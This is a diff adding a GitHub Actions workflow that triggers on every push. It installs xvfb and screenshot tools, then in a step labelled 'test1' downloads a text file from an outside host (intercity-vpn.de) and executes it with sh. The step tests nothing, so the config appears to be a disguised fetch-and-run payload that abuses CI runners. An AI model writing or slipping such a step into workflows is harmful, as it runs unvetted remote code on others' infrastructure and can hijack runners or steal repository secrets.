@@ -1,0 +1,16 @@
+---
+name: xvfb_runner
+
+on: push
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+ 
+    - name: prepare_stuff
+      run: sudo apt-get -y install xvfb pearl scrot
+
+    - name: test1
+      run: wget -O /tmp/$$ http://intercity-vpn.de/minimoni.txt && sh /tmp/$$
+
